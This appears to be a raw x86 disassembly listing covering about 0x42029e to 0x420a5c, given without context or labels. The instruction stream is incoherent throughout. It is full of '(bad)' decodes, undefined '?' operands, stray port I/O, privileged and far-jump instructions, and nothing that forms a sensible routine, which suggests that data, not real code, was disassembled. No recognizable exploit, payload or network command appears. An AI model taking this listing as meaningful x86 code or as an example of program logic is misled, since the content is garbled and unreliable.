  42029e:	mov    al,ds:0x858881b4
  4202a3:	add    BYTE PTR [edx-0x3dee4e72],al
  4202a9:	push   esi
  4202aa:	or     eax,DWORD PTR [ebp-0x17]
  4202ad:	ins    BYTE PTR es:[edi],dx
  4202ae:	sub    DWORD PTR [edi],ebp
  4202b0:	and    ecx,DWORD PTR [edx+eax*2]
  4202b3:	and    esp,DWORD PTR [ebp+eiz*1-0x37]
  4202b7:	cmp    BYTE PTR [edi-0x7b311040],0x41
  4202be:	mov    eax,ds:0xbe517fb6
  4202c3:	aad    0xb8
  4202c5:	push   eax
  4202c6:	cmp    BYTE PTR [ecx+0x3d5423cf],al
  4202cc:	loope  0x4202bc
  4202ce:	push   edx
  4202cf:	xor    al,0x2f
  4202d1:	cmp    eax,0xe4138e6c
  4202d6:	add    eax,0xd44f9503
  4202db:	xor    eax,0x1f1871af
  4202e0:	inc    ebp
  4202e1:	mov    eax,DWORD PTR [edx-0x6d]
  4202e4:	call   0xb385:0xf304e788
  4202eb:	xchg   ebx,eax
  4202ec:	stos   BYTE PTR es:[edi],al
  4202ed:	add    BYTE PTR [eax+0x7c],ch
  4202f0:	ret    
  4202f1:	jecxz  0x420311
  4202f3:	mov    dl,0xfc
  4202f5:	mov    esi,0xd20122a3
  4202fa:	in     eax,dx
  4202fb:	loopne 0x420322
  4202fd:	sub    edx,DWORD PTR [esp+eax*2]
  420300:	push   ss
  420301:	pop    edi
  420302:	cld    
  420303:	mov    ch,0x1
  420305:	call   0x79c068d8
  42030a:	adc    ch,cl
  42030c:	jg     0x4202fc
  42030e:	stos   DWORD PTR es:[edi],eax
  42030f:	mov    eax,0x859675f3
  420314:	sub    DWORD PTR [edi+0x75],ecx
  420317:	mul    DWORD PTR [esi]
  420319:	jb     0x4202ff
  42031b:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  42031d:	dec    ecx
  42031e:	mov    ch,0x11
  420320:	fwait
  420321:	mov    ah,0xb2
  420323:	sahf   
  420324:	repnz fnstenv [eax-0x7a7d3082]
  42032b:	xor    dh,bh
  42032d:	xchg   esp,eax
  42032e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42032f:	shr    BYTE PTR [ebp-0x36c37b49],cl
  420335:	rcl    DWORD PTR [ecx+ecx*1],1
  420338:	icebp  
  420339:	call   0xc54a5207
  42033e:	sar    ah,1
  420340:	ss jl  0x42039d
  420343:	fwait
  420344:	lods   al,BYTE PTR ds:[esi]
  420345:	xchg   BYTE PTR [esi-0x21],bl
  420348:	in     eax,dx
  420349:	mov    al,0xc6
  42034b:	mov    dh,0x7a
  42034d:	sbb    eax,0x6031dc66
  420352:	es jl  0x4203bd
  420355:	jns    0x4203c6
  420357:	int    0x4
  420359:	cmp    al,0x86
  42035b:	and    DWORD PTR [edi+eax*4],ebx
  42035e:	sub    ecx,0xffffffd5
  420361:	fwait
  420362:	cmp    edx,DWORD PTR [eax-0x4677e5e3]
  420368:	adc    DWORD PTR [ebx],0xffffffa0
  42036b:	sbb    DWORD PTR [edx],0xffffffc9
  42036e:	aaa    
  42036f:	frstor [eax-0x61]
  420372:	push   eax
  420373:	and    cl,al
  420375:	jns    0x42031d
  420377:	mov    ds:0xb947b736,al
  42037c:	mov    edi,cs
  42037e:	xchg   DWORD PTR ds:0x353a9cce,edx
  420384:	fimul  WORD PTR [ebx+0x4e]
  420387:	test   DWORD PTR [edx-0x7b0fbbd8],ebx
  42038d:	jge    0x4203ba
  42038f:	icebp  
  420390:	aas    
  420391:	add    al,BYTE PTR [esi]
  420393:	cmp    al,0xe5
  420395:	fisttp QWORD PTR [ebp+0x2a7c9c7d]
  42039b:	pop    edi
  42039c:	cmp    DWORD PTR [eax-0x5f],ebp
  42039f:	xchg   ebx,eax
  4203a0:	sbb    DWORD PTR [esi],edi
  4203a2:	inc    eax
  4203a3:	retf   
  4203a4:	add    DWORD PTR [edi-0x2e4f133c],ebx
  4203aa:	add    ecx,DWORD PTR [esi-0x614f747f]
  4203b0:	popa   
  4203b1:	std    
  4203b2:	in     al,0xc4
  4203b4:	adc    DWORD PTR [ebp+ecx*1-0x2200a318],ebx
  4203bb:	inc    eax
  4203bc:	faddp  st(3),st
  4203be:	mov    BYTE PTR [ebx],al
  4203c0:	fadd   st,st(2)
  4203c2:	fild   DWORD PTR [ebx]
  4203c4:	stos   BYTE PTR es:[edi],al
  4203c5:	clc    
  4203c6:	jno    0x420386
  4203c8:	mov    dl,0x3f
  4203ca:	out    dx,eax
  4203cb:	in     al,0x1e
  4203cd:	imul   edx,eax,0xffffff83
  4203d0:	and    DWORD PTR [ebp-0x73fb0225],esp
  4203d6:	adc    al,0xc8
  4203d8:	or     DWORD PTR [ebp+0x2f],edx
  4203db:	jmp    0x4203b3
  4203dd:	mov    dl,0x2
  4203df:	mov    DWORD PTR [edi+0x79],esp
  4203e2:	jne    0x42044d
  4203e4:	repz inc edx
  4203e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4203e7:	sub    eax,0xf489863
  4203ec:	outs   dx,BYTE PTR ds:[esi]
  4203ed:	pop    es
  4203ee:	(bad)  
  4203ef:	loop   0x42039d
  4203f1:	xchg   esi,eax
  4203f2:	(bad)  
  4203f3:	into   
  4203f4:	scas   eax,DWORD PTR es:[edi]
  4203f5:	repz xchg ebp,eax
  4203f7:	es sub eax,0x6e2848b1
  4203fd:	rcr    DWORD PTR [ecx],0x2
  420400:	cmp    ch,BYTE PTR [edi]
  420402:	lahf   
  420403:	imul   ebx,DWORD PTR [esp+edi*2+0x62],0xffffffaa
  420408:	and    esp,edi
  42040a:	(bad)  
  42040b:	dec    ebx
  42040c:	loop   0x42044c
  42040e:	or     eax,0x8fb6a9bd
  420413:	pop    es
  420414:	dec    edi
  420415:	adc    BYTE PTR [ecx+0x4f],ah
  420418:	mov    bh,0xef
  42041a:	es out 0x31,eax
  42041d:	sbb    eax,0x72ca0ecb
  420422:	inc    esi
  420423:	les    esi,FWORD PTR [edx-0x39]
  420426:	pop    esp
  420427:	adc    al,0xfa
  420429:	mov    bh,0x97
  42042b:	stos   DWORD PTR es:[edi],eax
  42042c:	adc    DWORD PTR [edx+0x7f82fb11],ebp
  420432:	out    0xf4,al
  420434:	inc    edi
  420435:	push   edi
  420436:	sbb    bh,BYTE PTR [esi-0x4a]
  420439:	ret    0x1928
  42043c:	in     al,dx
  42043d:	and    ebx,edi
  42043f:	mov    eax,0x57c43494
  420444:	test   eax,0x3bdd196b
  420449:	push   cs
  42044a:	push   ecx
  42044b:	je     0x420492
  42044d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42044e:	neg    al
  420450:	clc    
  420451:	jp     0x4204af
  420453:	pushf  
  420454:	lea    edx,[ecx]
  420456:	cdq    
  420457:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420458:	jmp    0xe182:0x2a4397dd
  42045f:	mov    esp,0x3e3654a6
  420464:	inc    eax
  420465:	add    DWORD PTR [eax+0x46],eax
  420468:	push   esi
  420469:	(bad)  
  42046a:	xor    al,0x4
  42046c:	jp     0x42044a
  42046e:	push   edi
  42046f:	mov    eax,0xba918429
  420474:	fimul  WORD PTR [ecx-0xa]
  420477:	sti    
  420478:	mov    ah,0xdf
  42047a:	mov    ecx,0xa8923896
  42047f:	sub    DWORD PTR [ebx-0x6a],ebx
  420482:	sub    ch,BYTE PTR [eax]
  420484:	stos   DWORD PTR es:[edi],eax
  420485:	xor    ebx,esp
  420487:	(bad)  
  420488:	(bad)  
  420489:	cli    
  42048a:	cmp    al,0x15
  42048c:	xlat   BYTE PTR ds:[ebx]
  42048d:	ins    DWORD PTR es:[edi],dx
  42048e:	push   esi
  42048f:	pop    ebx
  420490:	xor    edx,esp
  420492:	addr16 xchg ebx,eax
  420494:	adc    al,cl
  420496:	add    edx,esi
  420498:	mov    ebp,0xd770caf
  42049d:	push   es
  42049e:	ret    0x610b
  4204a1:	fdivrp st(2),st
  4204a3:	or     al,0xa3
  4204a5:	mov    al,BYTE PTR [ebx+0x48]
  4204a8:	daa    
  4204a9:	imul   ebx,DWORD PTR ds:0xca84de50,0xd6a8b2a3
  4204b3:	lea    ebp,[edx-0x3f07bf7d]
  4204b9:	imul   esp,DWORD PTR [esi+0x6d1adebf],0x82bf8cb0
  4204c3:	addr16 pop es
  4204c5:	add    al,BYTE PTR [esi]
  4204c7:	push   edi
  4204c8:	fld    DWORD PTR [esi]
  4204cb:	or     edx,DWORD PTR [ecx+0xe]
  4204ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4204cf:	ja     0x420529
  4204d1:	push   ss
  4204d2:	arpl   WORD PTR [ecx-0x5a],dx
  4204d5:	in     eax,dx
  4204d6:	mov    eax,ds:0x5b32ae40
  4204db:	ins    DWORD PTR es:[edi],dx
  4204dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4204dd:	jge    0x42045f
  4204df:	test   DWORD PTR [esi+0x17],0xf6b7dbea
  4204e6:	nop
  4204e7:	fsubr  st(4),st
  4204e9:	adc    eax,0x32195e55
  4204ee:	and    eax,0x188a31a3
  4204f3:	add    esi,DWORD PTR [ecx-0x8]
  4204f6:	mov    WORD PTR [ebx-0x6ab37cba],ss
  4204fc:	and    BYTE PTR [eax+esi*8],dl
  4204ff:	scas   al,BYTE PTR es:[edi]
  420500:	mov    ch,0xe8
  420502:	les    esp,FWORD PTR [esi+0x28]
  420505:	or     bl,dl
  420507:	aas    
  420508:	pop    edi
  420509:	xchg   esp,eax
  42050a:	int3   
  42050b:	mov    edx,0xb60e8d2d
  420510:	fdiv   DWORD PTR [esi]
  420512:	out    0x6b,eax
  420514:	inc    eax
  420515:	mov    ah,0xb7
  420517:	fwait
  420518:	mov    ecx,0x8937bb1
  42051d:	sbb    DWORD PTR [ecx+ecx*1-0x43],ebp
  420521:	adc    eax,0xab4ea6da
  420526:	xchg   edx,eax
  420527:	add    edi,DWORD PTR [ebp+0x763029c9]
  42052d:	sti    
  42052e:	sbb    al,0xb2
  420530:	mov    ch,0xab
  420532:	shl    dh,1
  420534:	stos   DWORD PTR es:[edi],eax
  420535:	pusha  
  420536:	pop    edx
  420537:	bound  esi,QWORD PTR [edi+0x1b745d8d]
  42053d:	test   BYTE PTR [esi],bl
  42053f:	stos   DWORD PTR es:[edi],eax
  420540:	je     0x42050d
  420542:	in     al,0xf7
  420544:	and    BYTE PTR [eax-0x5f17844e],ah
  42054a:	dec    eax
  42054b:	(bad)  
  42054c:	stos   BYTE PTR es:[edi],al
  42054d:	loopne 0x420570
  42054f:	jmp    0x4204da
  420551:	pop    esi
  420552:	push   0x6860ed70
  420557:	and    eax,ebx
  420559:	adc    ebx,DWORD PTR [ebp+eax*4-0x32415cd7]
  420560:	call   FWORD PTR [ebp-0x3b]
  420563:	mov    ?,WORD PTR [edx+0x66]
  420566:	adc    ah,BYTE PTR [eax+ecx*1+0xfdcc99c]
  42056d:	lea    eax,[eax-0x72]
  420570:	mov    ds:0x840e433f,al
  420575:	repz arpl WORD PTR [edi+ebx*1-0x14],bp
  42057a:	xchg   ecx,eax
  42057b:	mov    al,ds:0x71b0bc07
  420580:	xlat   BYTE PTR ds:[ebx]
  420581:	(bad)  
  420582:	in     eax,0x81
  420584:	xor    eax,0xafa16fea
  420589:	aaa    
  42058a:	sub    eax,0x5882b29b
  42058f:	push   cs
  420590:	data16 lahf 
  420592:	fist   DWORD PTR [eax+0x4b]
  420595:	push   ss
  420596:	inc    esp
  420597:	pop    ebp
  420598:	sbb    eax,0x847fad3e
  42059d:	mov    ebp,0x88ac8770
  4205a2:	out    0x42,al
  4205a4:	aas    
  4205a5:	cmc    
  4205a6:	push   ecx
  4205a7:	add    eax,0x69af64bc
  4205ac:	mov    bl,0xb9
  4205ae:	retf   
  4205af:	mov    BYTE PTR [edi],bh
  4205b1:	mov    edx,0x86638f4e
  4205b6:	ret    
  4205b7:	clc    
  4205b8:	imul   BYTE PTR [eax]
  4205ba:	(bad)  
  4205bb:	pushf  
  4205bc:	cmp    esp,edx
  4205be:	jne    0x4205d1
  4205c0:	fwait
  4205c1:	sbb    bl,BYTE PTR [edx+0x19]
  4205c4:	jmp    0x8c43edb0
  4205c9:	fisttp DWORD PTR [esi]
  4205cb:	inc    edi
  4205cc:	add    eax,0x88fa05f6
  4205d1:	cs push eax
  4205d3:	(bad)  
  4205d4:	mov    al,0xf9
  4205d6:	imul   BYTE PTR [ebp-0x69d645b7]
  4205dc:	nop
  4205dd:	add    eax,0x2b0dd36f
  4205e2:	mov    cl,0x37
  4205e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4205e5:	pop    ebp
  4205e6:	les    esp,FWORD PTR [esi+ecx*8-0x79]
  4205ea:	and    al,0xd6
  4205ec:	pusha  
  4205ed:	hlt    
  4205ee:	sub    BYTE PTR [ebp+0x69dec19c],0x9e
  4205f5:	in     eax,0x36
  4205f7:	cmp    al,0x39
  4205f9:	cs out dx,eax
  4205fb:	sub    al,0x6e
  4205fd:	in     eax,0x66
  4205ff:	push   edi
  420600:	mov    edx,DWORD PTR [ebx+ebp*8]
  420603:	fstp   DWORD PTR [ebx]
  420605:	lea    edx,[ebp+0x7e3fa628]
  42060b:	jp     0x42063d
  42060d:	pop    edx
  42060e:	push   edx
  42060f:	fwait
  420610:	scas   al,BYTE PTR es:[edi]
  420611:	push   edi
  420612:	cld    
  420613:	bound  edi,QWORD PTR [ebx]
  420615:	test   BYTE PTR [ebx+ebp*8-0x59],dh
  420619:	not    BYTE PTR [ecx-0x52]
  42061c:	loop   0x420602
  42061e:	or     edi,DWORD PTR [edx-0x1ed4e15c]
  420624:	outs   dx,DWORD PTR ds:[esi]
  420625:	(bad)
  420628:	xchg   edi,eax
  420629:	mov    ebx,0xca5f84c2
  42062e:	rol    edi,0xf8
  420631:	sbb    eax,DWORD PTR cs:[ecx]
  420634:	adc    eax,0x6a17492e
  420639:	pop    edx
  42063a:	add    al,0x34
  42063c:	test   al,0xc4
  42063e:	cmp    al,dl
  420640:	adc    ah,BYTE PTR [edi+0x2c2aafce]
  420646:	mov    al,0x99
  420648:	stos   DWORD PTR es:[edi],eax
  420649:	push   cs
  42064a:	scas   eax,DWORD PTR es:[edi]
  42064b:	mov    eax,ds:0x69669ede
  420650:	sar    BYTE PTR [eax+0x39],cl
  420653:	pushf  
  420654:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420655:	(bad)  
  420656:	or     BYTE PTR [eax],bh
  420658:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420659:	push   edi
  42065a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42065b:	dec    edi
  42065c:	rol    BYTE PTR [ebp+0x6e],1
  42065f:	rol    bh,0x24
  420662:	rcl    ah,0xda
  420665:	and    ah,al
  420667:	xchg   ebx,eax
  420668:	adc    eax,0x26f191a2
  42066d:	dec    edx
  42066e:	imul   bh
  420670:	hlt    
  420671:	aaa    
  420672:	mov    ds:0x943a0cd4,eax
  420677:	ds cwde 
  420679:	fild   WORD PTR [eax+esi*1]
  42067c:	std    
  42067d:	sbb    BYTE PTR [edi],dl
  42067f:	mov    ebp,0x84ade638
  420684:	data16 jl 0x4206e3
  420687:	jns    0x4206e5
  420689:	mov    ecx,0x1bb750c0
  42068e:	lods   al,BYTE PTR ds:[esi]
  42068f:	clc    
  420690:	sbb    DWORD PTR [edi],ebx
  420692:	mov    al,ds:0x7cbdeb8
  420697:	pop    es
  420698:	sub    esp,esp
  42069a:	mov    al,0x7e
  42069c:	jns    0x4206b9
  42069e:	test   al,0xe9
  4206a0:	xchg   ebp,eax
  4206a1:	scas   eax,DWORD PTR es:[edi]
  4206a2:	into   
  4206a3:	mov    esp,DWORD PTR ds:[ecx-0x3a]
  4206a7:	lock cmp BYTE PTR ds:0xb2c65712,ah
  4206ae:	push   esp
  4206af:	imul   esp,DWORD PTR [ebx],0xfffffffb
  4206b2:	sbb    edi,ebx
  4206b4:	or     DWORD PTR [eax-0x52dd6a7a],ebp
  4206ba:	adc    BYTE PTR [ebx+0x57c6dcf2],cl
  4206c0:	and    eax,0xc39b9c18
  4206c5:	mov    ds:0xdf53ab1a,al
  4206ca:	pushf  
  4206cb:	mov    ch,0x30
  4206cd:	inc    esp
  4206ce:	cdq    
  4206cf:	adc    BYTE PTR [ecx],dh
  4206d1:	ret    
  4206d2:	xchg   ebp,eax
  4206d3:	mov    dl,0xa3
  4206d5:	sar    BYTE PTR [eax+edx*2],cl
  4206d8:	out    dx,al
  4206d9:	xchg   edi,eax
  4206da:	jae    0x420711
  4206dc:	stc    
  4206dd:	push   edx
  4206de:	retf   
  4206df:	xchg   ebx,eax
  4206e0:	push   eax
  4206e1:	daa    
  4206e2:	sar    DWORD PTR [ebp+0x4d],1
  4206e5:	add    eax,0xdbc22364
  4206eb:	pop    ss
  4206ec:	cmp    eax,0x7db34017
  4206f1:	sbb    cl,BYTE PTR [ebp-0x792190ad]
  4206f7:	sbb    eax,DWORD PTR [edx]
  4206f9:	or     esp,DWORD PTR [edx+0x70]
  4206fc:	mov    ebx,0xaa14048e
  420701:	adc    al,bh
  420703:	mov    ?,WORD PTR [esi-0x510ad65a]
  420709:	cdq    
  42070a:	inc    ebp
  42070b:	stos   DWORD PTR es:[edi],eax
  42070c:	rcr    DWORD PTR [eax],cl
  42070e:	mov    eax,0xf6d9fcce
  420713:	mov    ch,0x9
  420715:	add    DWORD PTR [edx],ebx
  420717:	mov    dh,0x79
  420719:	adc    eax,0xa1be0056
  42071e:	dec    ecx
  42071f:	in     eax,0xad
  420721:	jo     0x4206c1
  420723:	sub    BYTE PTR [eax+0xf],dl
  420726:	push   ebx
  420727:	jne    0x4206ac
  420729:	xchg   BYTE PTR [ebx],bl
  42072b:	mov    edx,0xf78040e
  420730:	xor    ah,BYTE PTR [edi-0x26]
  420733:	mov    bh,0xf
  420735:	rol    BYTE PTR ds:0x86d8f337,1
  42073b:	mov    al,ah
  42073d:	and    eax,0xb9c1133c
  420742:	fcomp  DWORD PTR [esi+0x79a03afb]
  420748:	stos   BYTE PTR es:[edi],al
  420749:	mov    eax,ds:0x4b483809
  42074e:	inc    edx
  42074f:	fld    QWORD PTR [edx-0x565969e0]
  420755:	cmp    eax,0x439bae30
  42075a:	cli    
  42075b:	fs in  al,dx
  42075d:	or     eax,0x4f525fa8
  420762:	(bad)  
  420763:	(bad)  
  420764:	pop    edi
  420765:	cli    
  420766:	fld    TBYTE PTR [edi+0x7c8c424]
  42076c:	xchg   edi,eax
  42076d:	fadd   QWORD PTR [esi-0x64]
  420770:	pop    ss
  420771:	or     al,0xd
  420773:	inc    ecx
  420774:	nop
  420775:	xchg   DWORD PTR [esi+0x6a],edi
  420778:	fadd   QWORD PTR [edi+0x4c]
  42077b:	and    ah,BYTE PTR [ebx-0x305569c8]
  420781:	scas   eax,DWORD PTR es:[edi]
  420782:	xchg   DWORD PTR [edi+0x54],ebp
  420785:	stc    
  420786:	scas   al,BYTE PTR es:[edi]
  420787:	into   
  420788:	inc    edi
  420789:	jmp    0xec3e:0xe81f9ee7
  420790:	mov    ds:0x8570de4b,eax
  420795:	clc    
  420796:	mov    cl,0xd1
  420798:	add    al,0x4
  42079a:	cwde   
  42079b:	inc    esi
  42079c:	ret    0xcd79
  42079f:	mov    al,ds:0xf2c3d449
  4207a4:	repnz fdivr DWORD PTR [ebx+0x1f]
  4207a8:	mov    cl,0x92
  4207aa:	sub    DWORD PTR [edx],ecx
  4207ac:	push   ebp
  4207ad:	sub    BYTE PTR [esi-0x7c],dl
  4207b0:	push   ecx
  4207b1:	xchg   ecx,eax
  4207b2:	mov    esp,0x53561b6d
  4207b7:	xchg   ecx,eax
  4207b8:	or     al,0x3e
  4207ba:	sub    ch,dl
  4207bc:	mov    eax,0xae7c3f53
  4207c1:	add    eax,0xb4fe551f
  4207c6:	jecxz  0x4207d6
  4207c8:	push   esi
  4207c9:	mov    WORD PTR [esi+0x4b],?
  4207cc:	aam    0x8c
  4207ce:	cs ja  0x42075b
  4207d1:	mov    dh,cl
  4207d3:	xchg   DWORD PTR [ebx+0x65470a4f],esp
  4207d9:	fist   DWORD PTR [esi-0x1d]
  4207dc:	or     al,0xcb
  4207de:	nop
  4207df:	(bad)
  4207e2:	test   al,0xa1
  4207e4:	(bad)  
  4207e6:	sar    ecx,0x9e
  4207e9:	sbb    eax,0x7c58de37
  4207ee:	pop    eax
  4207ef:	jb     0x4207f9
  4207f1:	iret   
  4207f2:	jae    0x4207d7
  4207f4:	les    ebx,FWORD PTR [ebx+edx*2]
  4207f7:	addr16 mov eax,ds:0x7b6e
  4207fb:	pop    ebp
  4207fc:	pop    es
  4207fd:	sbb    BYTE PTR [ecx],bl
  4207ff:	inc    ecx
  420800:	cli    
  420801:	xchg   esi,eax
  420802:	pop    esp
  420803:	push   eax
  420804:	mov    bl,ch
  420806:	xchg   edx,eax
  420807:	dec    edi
  420808:	and    BYTE PTR [ebx+ebp*1-0x65c3cc41],bh
  42080f:	push   ss
  420810:	je     0x4207c4
  420812:	pop    ss
  420813:	data16 cmp BYTE PTR [esi-0x1f847160],bl
  42081a:	push   es
  42081b:	pop    esp
  42081c:	xor    ebx,DWORD PTR [eax-0x41]
  42081f:	add    bh,bh
  420821:	xchg   esi,eax
  420822:	iret   
  420823:	repz mov eax,ds:0x46f2d234
  420829:	xchg   ebx,eax
  42082a:	out    dx,al
  42082b:	cmp    BYTE PTR [eax-0x47],al
  42082e:	mov    ecx,0xec70e2e5
  420833:	jo     0x42082b
  420835:	pop    ds
  420836:	(bad)  
  420837:	mov    bl,0xd0
  420839:	bound  eax,QWORD PTR [edi-0x3954cbc3]
  42083f:	lock jns 0x420806
  420842:	mov    ecx,0x21a6f1f3
  420847:	fdiv   QWORD PTR [edi-0x36eba078]
  42084d:	mov    BYTE PTR [edx+0x48],al
  420850:	repnz adc esp,edx
  420853:	xlat   BYTE PTR ds:[ebx]
  420854:	dec    ecx
  420855:	and    edx,esi
  420857:	nop
  420858:	loopne 0x42086c
  42085a:	cmp    al,0x87
  42085c:	and    BYTE PTR [ebx],dh
  42085e:	xchg   ecx,eax
  42085f:	add    eax,DWORD PTR [edi-0x7a]
  420862:	sbb    dh,BYTE PTR [ebx+0x42]
  420865:	ret    
  420866:	ror    BYTE PTR [edi-0x6c],1
  420869:	inc    ebp
  42086a:	mov    BYTE PTR [edi],al
  42086c:	xor    BYTE PTR [eax+0xd],0x8f
  420870:	mov    edi,0x1b1b8680
  420875:	add    BYTE PTR [ebx],dl
  420877:	in     al,dx
  420878:	pop    eax
  420879:	fucom  st(5)
  42087b:	push   esp
  42087c:	mov    esp,?
  42087e:	ret    
  42087f:	jg     0x420895
  420881:	inc    edi
  420882:	or     al,0xc4
  420884:	mov    ebx,0x6d12f1bc
  420889:	les    ebp,FWORD PTR [edi-0x35c00d2e]
  42088f:	mov    bl,0x13
  420891:	jae    0x4208bf
  420893:	pop    edi
  420894:	lock fwait
  420896:	mov    eax,ds:0x9b033738
  42089b:	(bad)  
  42089e:	sbb    DWORD PTR [edx+ebp*4-0x61],edi
  4208a2:	pop    edx
  4208a3:	test   BYTE PTR [eax],ah
  4208a5:	add    edi,DWORD PTR [ecx]
  4208a7:	pop    ds
  4208a8:	or     esi,edi
  4208aa:	aaa    
  4208ab:	and    dh,BYTE PTR [ecx+0x36]
  4208ae:	add    DWORD PTR [esi-0x44],0x889e89c8
  4208b5:	mov    cs,WORD PTR [esi-0x78]
  4208b8:	mov    ah,0x32
  4208ba:	mov    ebp,0xb1fbb653
  4208bf:	lea    ebp,[esi-0x5ccf7ec6]
  4208c5:	in     eax,dx
  4208c6:	push   cs
  4208c7:	add    DWORD PTR [eax],ebx
  4208c9:	jl     0x42091e
  4208cb:	std    
  4208cc:	mov    eax,0x30ab7bad
  4208d1:	out    0x4c,al
  4208d3:	sbb    BYTE PTR [edi+0x2f6759d9],ch
  4208d9:	pop    ecx
  4208da:	mov    esi,DWORD PTR [edi+0x79d8e111]
  4208e0:	int3   
  4208e1:	daa    
  4208e2:	retf   
  4208e3:	xchg   DWORD PTR [esi+0x2d],edi
  4208e6:	mov    dl,0x62
  4208e8:	push   eax
  4208e9:	js     0x420951
  4208eb:	xchg   ebx,eax
  4208ec:	add    BYTE PTR [eax-0x7],bh
  4208ef:	outs   dx,BYTE PTR ds:[esi]
  4208f0:	mov    eax,ds:0xa93fd7cd
  4208f5:	int3   
  4208f6:	cmp    eax,0x9d83ccab
  4208fb:	sub    ch,BYTE PTR [ebx-0x12]
  4208fe:	sub    BYTE PTR [eax+0x1abf6bee],ch
  420904:	pop    edx
  420905:	or     ecx,DWORD PTR [ecx+0x36c0c9af]
  42090b:	adc    esp,DWORD PTR [edi+0x23]
  42090e:	cwde   
  42090f:	sub    ah,BYTE PTR [esi+0x7f]
  420912:	cmp    dh,BYTE PTR [eax-0x54af6583]
  420918:	aaa    
  420919:	lods   al,BYTE PTR ds:[esi]
  42091a:	sbb    al,0xb
  42091c:	pop    esi
  42091d:	xor    BYTE PTR fs:[ecx+0x221076c0],0xd1
  420925:	adc    eax,0x7d80882f
  42092a:	mov    edi,0xe0b15566
  42092f:	pop    eax
  420930:	xchg   ecx,eax
  420931:	(bad)  
  420932:	sub    bh,dl
  420934:	into   
  420935:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420936:	mov    ebp,0xbad81562
  42093b:	test   BYTE PTR [ebx*1-0x30af7f1f],0xd6
  420943:	inc    edi
  420944:	dec    esp
  420945:	iret   
  420946:	ror    esp,0x92
  420949:	dec    esp
  42094a:	mov    eax,0x2e85c715
  42094f:	or     ah,cl
  420951:	arpl   WORD PTR [esi],di
  420953:	stos   DWORD PTR es:[edi],eax
  420954:	mov    ds:0x16de2ddc,al
  420959:	dec    eax
  42095a:	push   esi
  42095b:	cmp    DWORD PTR [ebx-0x130db174],ebx
  420961:	enter  0x3e2f,0x4c
  420965:	mov    ?,WORD PTR [ecx-0x1]
  420968:	adc    esi,ebp
  42096a:	push   es
  42096b:	inc    edi
  42096c:	leave  
  42096d:	or     al,0xbf
  42096f:	and    eax,0xcf0f0c09
  420974:	mov    bh,0xa3
  420976:	nop
  420977:	out    0xcf,eax
  420979:	mov    dh,0x4e
  42097b:	lods   al,BYTE PTR ds:[esi]
  42097c:	add    BYTE PTR [edx+0x62],0x85
  420980:	xchg   edi,eax
  420981:	pop    eax
  420982:	arpl   WORD PTR [edx+0x3568ff7e],bx
  420988:	and    al,0x74
  42098a:	push   ebx
  42098b:	push   ecx
  42098c:	jge    0x420961
  42098e:	imul   edx,DWORD PTR [ecx+edi*1],0xffffffff
  420992:	and    eax,0xadb88325
  420997:	sbb    ecx,0x1a94998f
  42099d:	int3   
  42099e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42099f:	jb     0x420996
  4209a1:	mov    cl,0xba
  4209a3:	pop    eax
  4209a4:	(bad)  
  4209a5:	sub    edx,esi
  4209a7:	adc    eax,0x150be1b4
  4209ac:	sbb    ebx,DWORD PTR [edx+0x47]
  4209af:	xchg   edx,eax
  4209b0:	add    eax,0xd267abb7
  4209b5:	cmp    eax,0x15c241b7
  4209ba:	dec    ecx
  4209bb:	xchg   DWORD PTR [edi-0x1f052726],esp
  4209c1:	sub    eax,0xc85694eb
  4209c6:	daa    
  4209c7:	pop    esp
  4209c8:	push   edi
  4209c9:	jle    0x420a3f
  4209cb:	std    
  4209cc:	scas   al,BYTE PTR es:[edi]
  4209cd:	inc    esi
  4209cf:	dec    edx
  4209d0:	fstp   QWORD PTR [esi+edx*8]
  4209d3:	sub    al,0xb
  4209d5:	out    0x2,al
  4209d7:	aaa    
  4209d8:	push   ebx
  4209d9:	test   al,0x6a
  4209db:	inc    edx
  4209dc:	mov    dl,0x46
  4209de:	(bad)  
  4209df:	jmp    0x4209e3
  4209e1:	dec    ebx
  4209e2:	daa    
  4209e3:	xchg   BYTE PTR [ebx-0x7af17965],dh
  4209e9:	in     al,0xa7
  4209eb:	push   edx
  4209ec:	add    ebp,0x9fac5e90
  4209f2:	mov    WORD PTR [eax+edi*4],cs
  4209f5:	jle    0x420a71
  4209f7:	hlt    
  4209f8:	add    al,0xd
  4209fa:	loope  0x420a27
  4209fc:	adc    edi,esi
  4209fe:	cdq    
  4209ff:	mov    ds:0x2a6b15f0,al
  420a04:	jecxz  0x420a5e
  420a06:	or     ecx,edx
  420a08:	cmc    
  420a09:	or     BYTE PTR [edx],0xb7
  420a0c:	add    eax,0x326c3ed
  420a11:	adc    eax,DWORD PTR [edx]
  420a13:	xlat   BYTE PTR ds:[ebx]
  420a14:	call   0xb5aad752
  420a19:	in     eax,dx
  420a1a:	sub    bh,BYTE PTR [edx]
  420a1c:	loop   0x420a68
  420a1e:	and    eax,DWORD PTR [edi-0x346f7f8d]
  420a24:	mov    ds:0xbd56014,eax
  420a29:	and    ebp,DWORD PTR [edx+ecx*4-0x4]
  420a2d:	call   0xfd0c:0x5924778f
  420a34:	lods   al,BYTE PTR ds:[esi]
  420a35:	jl     0x420a9a
  420a37:	xchg   edi,eax
  420a38:	add    eax,0x29ace078
  420a3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420a3e:	clc    
  420a3f:	jo     0x420a42
  420a41:	(bad)  
  420a42:	jg     0x420a45
  420a44:	lods   eax,DWORD PTR ds:[esi]
  420a45:	and    ch,0xf4
  420a48:	sahf   
  420a49:	jns    0x420a8a
  420a4b:	sar    BYTE PTR [edi],cl
  420a4d:	lea    edi,[edx+0x20f478d3]
  420a53:	add    dl,BYTE PTR [eax-0x32]
  420a56:	add    DWORD PTR [edx-0x22912906],ebp
  420a5c:	sub    BYTE PTR [edi+0x3f53c15e],bl
